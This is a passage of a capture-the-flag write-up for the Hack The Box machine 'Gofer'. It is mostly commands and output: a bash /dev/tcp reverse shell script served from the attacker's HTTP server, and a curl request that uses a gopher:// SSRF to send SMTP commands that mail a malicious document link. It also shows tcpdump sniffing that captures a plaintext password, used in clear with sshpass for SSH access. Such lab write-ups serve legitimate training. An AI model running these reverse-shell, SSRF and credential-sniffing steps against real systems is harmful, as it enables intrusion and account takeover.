+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="n">File</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span> <span class="s2">"GET /ThisWasExecuted HTTP/1.1"</span> <span class="mi">404</span> <span class="o">-</span>
+</pre></div>
+
+At this stage, we have a system-level command execution attack vector, so we will attempt to set up a reverse shell.<br/><br/>
+Firstly, I'll create a file named <code>pwned.sh</code> with the following content:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pwned</span><span class="o">.</span><span class="n">sh</span>
+<span class="c1">#!/bin/bash </span>
+<span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.7</span><span class="o">/</span><span class="mi">3001</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+Now I will modify the command in the malicious macro.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/17.png"/><br/><br/>
+With this command, we'll ensure that upon making a request to the file <code>pwned.sh</code>, its content will be interpreted with bash, thereby enabling us to receive a reverse shell.<br/><br/>
+Firstly, we're going to set up our netcat (nc) listener on port 3001:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+</pre></div>
+
+Now, we'll host an HTTP Server serving the <code>pwned.sh</code> file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Finally, I will send the request to the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO</span><span class="si">%202130706433%</span><span class="s1">250d</span><span class="si">%250a</span><span class="s1">MAIL</span><span class="si">%20F</span><span class="s1">ROM%3A%3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">RCPT%20TO%3A%3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">DATA</span><span class="si">%250d%250a</span><span class="s1">From%3A</span><span class="si">%20%</span><span class="s1">5BHacker%5D</span><span class="si">%20%</span><span class="s1">3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">To%3A</span><span class="si">%20%</span><span class="s1">3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">Date%3A%20Tue%2C</span><span class="si">%2015%</span><span class="s1">20Sep</span><span class="si">%202017%</span><span class="s1">2017%3A20%3A26%20-0400</span><span class="si">%250d%250a</span><span class="s1">Subject%3A%20AH%20AH%20AH</span><span class="si">%250d%250a%250d%250a</span><span class="s1">http://10.10.16.7/pwned.odt</span><span class="si">%20%</span><span class="s1">21</span><span class="si">%250d%250a%250d%250a%250d%250a</span><span class="s1">.</span><span class="si">%250d%250a</span><span class="s1">QUIT</span><span class="si">%250d%250a</span><span class="s1">'</span>
+
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="mi">220</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Debian</span><span class="o">/</span><span class="n">GNU</span><span class="p">)</span>
+<span class="mi">250</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+<span class="mi">250</span> <span class="mf">2.1.0</span> <span class="n">Ok</span>
+<span class="mi">250</span> <span class="mf">2.1.5</span> <span class="n">Ok</span>
+<span class="mi">354</span> <span class="n">End</span> <span class="n">data</span> <span class="k">with</span> <span class="o">&lt;</span><span class="n">CR</span><span class="o">&gt;&lt;</span><span class="n">LF</span><span class="o">&gt;.&lt;</span><span class="n">CR</span><span class="o">&gt;&lt;</span><span class="n">LF</span><span class="o">&gt;</span>
+<span class="mi">250</span> <span class="mf">2.0.0</span> <span class="n">Ok</span><span class="p">:</span> <span class="n">queued</span> <span class="k">as</span> <span class="mi">7293</span><span class="n">F8142</span>
+<span class="mi">221</span> <span class="mf">2.0.0</span> <span class="n">Bye</span>
+</pre></div>
+
+Now, if we check our HTTP Server, we'll see that we've received two GET requests.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="s2">"GET /pwned.odt HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span> <span class="s2">"GET /pwned.sh HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+</pre></div>
+
+Finally, we've obtained a reverse shell on our netcat (nc) listener.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.225</span><span class="p">:</span><span class="mf">42468.</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">7760</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="n">bash</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">jhudson</span><span class="o">/.</span><span class="n">bashrc</span><span class="p">:</span> <span class="n">Permission</span> <span class="n">denied</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span>
+</pre></div>
+
+We've successfully gained access to the system. Now, let's adjust the TTY for a more comfortable interaction with the system.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+
+<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+                               <span class="n">reset</span>
+<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
+<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="err">$</span>
+</pre></div>
+
+As <code>jhudson</code>, we can access the first flag.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
+<span class="mi">3</span><span class="n">af8d</span><span class="o">*********************</span><span class="mi">9784</span><span class="n">f</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+<h3><br>Shell as tbuckley</br></h3><br>
+When listing the groups to which the user <code>jhudson</code> belongs, we can observe an unusual group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jhudson</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jhudson</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">jhudson</span><span class="p">),</span><span class="mi">108</span><span class="p">(</span><span class="n">netdev</span><span class="p">)</span>
+</pre></div>
+
+After researching online, I found that the <code>netdev</code> group is related to operating on network interfaces, among other things. It's something worth noting.<br/><br/>
+Next, we'll list the Set-UID files:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">libexec</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pkexec</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">notes</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+We notice an unusual file located at <code>/usr/local/bin</code>. Checking the permissions of this file, we find that we cannot execute it, but members of the <code>dev</code> group can.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">notes</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">s</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">dev</span> <span class="mi">17168</span> <span class="n">Apr</span> <span class="mi">28</span>  <span class="mi">2023</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">notes</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+When listing the capabilities, we immediately notice an unusual one:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">tcpdump</span> <span class="n">cap_net_admin</span><span class="p">,</span><span class="n">cap_net_raw</span><span class="o">=</span><span class="n">eip</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+We have the <code>cap_net_admin</code> capability to execute <code>tcpdump</code>, enabling us to conduct packet sniffing on all system interfaces.<br/><br/>
+Next, we'll run <code>tcpdump</code> to sniff packets on the network and store them in a capture. Storing them will allow us to later analyze the packets more conveniently using the Wireshark tool.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="nb">any</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">w</span> <span class="n">captura</span><span class="o">.</span><span class="n">cap</span>
+</pre></div>
+
+After a minute, I ended the process. If we list the contents of the current directory, we can see the file <code>captura.cap</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span>
+<span class="n">captura</span><span class="o">.</span><span class="n">cap</span>
+<span class="nd">@jhudson@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+After downloading the <code>captura.cap</code> file onto our attacker machine, we need to open it using WireShark:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/18.png"/><br/><br/>
+By filtering through protocols, we'll quickly notice HTTP requests:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/19.png"/><br/><br/>
+Upon closer inspection, we observe that these requests contain credentials:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/20.png"/><br/><br/>
+It appears the user is attempting authentication to <code>proxy.gofer.htb</code>, which, as we recall, requested credentials for access. These credentials are traveling in plain text, allowing us to copy and potentially use them to our advantage.<br/><br/>
+Given the attempt to authenticate as the user <code>tbuckley</code>, we can verify if these credentials belong to this system-level user.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'ooP4dietie3o_hquaeti'</span> <span class="n">ssh</span> <span class="n">tbuckley</span><span class="o">@</span><span class="mf">10.10.11.225</span>
+<span class="n">Linux</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="mf">5.10.0</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">amd64</span> <span class="c1">#1 SMP Debian 5.10.179-2 (2023-07-14) x86_64</span>
+
+<span class="n">The</span> <span class="n">programs</span> <span class="n">included</span> <span class="k">with</span> <span class="n">the</span> <span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">system</span> <span class="n">are</span> <span class="n">free</span> <span class="n">software</span><span class="p">;</span>
+<span class="n">the</span> <span class="n">exact</span> <span class="n">distribution</span> <span class="n">terms</span> <span class="k">for</span> <span class="n">each</span> <span class="n">program</span> <span class="n">are</span> <span class="n">described</span> <span class="ow">in</span> <span class="n">the</span>
+<span class="n">individual</span> <span class="n">files</span> <span class="ow">in</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span>
+
+<span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">comes</span> <span class="k">with</span> <span class="n">ABSOLUTELY</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span>
+<span class="n">permitted</span> <span class="n">by</span> <span class="n">applicable</span> <span class="n">law</span><span class="o">.</span>
+<span class="n">You</span> <span class="n">have</span> <span class="n">no</span> <span class="n">mail</span><span class="o">.</span>
+<span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+We've successfully accessed as the user <code>tbuckley</code> via SSH using the credentials obtained from the HTTP request.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+Listing the groups to which the user <code>tbuckley</code> belongs, we notice that they are part of the <code>dev</code> group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">tbuckley</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">tbuckley</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">tbuckley</span><span class="p">),</span><span class="mi">1004</span><span class="p">(</span><span class="n">dev</span><span class="p">)</span>
+<span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+As we can recall, this group had permission to execute a Set-UID binary, so we can attempt to leverage this to gain root access.<br/><br/>
+Let's execute the <code>/usr/local/bin/notes</code> binary:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">notes</span>
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+Upon initial inspection, we're presented with a menu featuring 9 options. Let's select option 1:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="n">Choose</span> <span class="n">an</span> <span class="n">username</span><span class="p">:</span> <span class="n">elswix</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+After providing a username, selecting option 2 displays information about the user.<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">2</span>
+
+
+<span class="n">Username</span><span class="p">:</span> <span class="n">elswix</span>
+<span class="n">Role</span><span class="p">:</span> <span class="n">user</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">6</span><span class="p">)</span> <span class="n">Save</span> <span class="n">a</span> <span class="n">note</span> <span class="p">(</span><span class="ow">not</span> <span class="n">yet</span> <span class="n">implemented</span><span class="p">)</span>
+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+It returns two fields: one for the username and the other for the role. <br/><br/>
+Upon attempting to access option 8, it displays the following message:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">Your</span> <span class="n">choice</span><span class="p">:</span> <span class="mi">8</span>
+
+<span class="n">Access</span> <span class="n">denied</span><span class="p">:</span> <span class="n">you</span> <span class="n">don</span><span class="err">`</span><span class="n">t</span> <span class="n">have</span> <span class="n">the</span> <span class="n">admin</span> <span class="n">role</span><span class="err">!</span>
+
+<span class="o">========================================</span>
+<span class="mi">1</span><span class="p">)</span> <span class="n">Create</span> <span class="n">an</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">choose</span> <span class="n">an</span> <span class="n">username</span>
+<span class="mi">2</span><span class="p">)</span> <span class="n">Show</span> <span class="n">user</span> <span class="n">information</span>
+<span class="mi">3</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">an</span> <span class="n">user</span>
+<span class="mi">4</span><span class="p">)</span> <span class="n">Write</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">5</span><span class="p">)</span> <span class="n">Show</span> <span class="n">a</span> <span class="n">note</span>
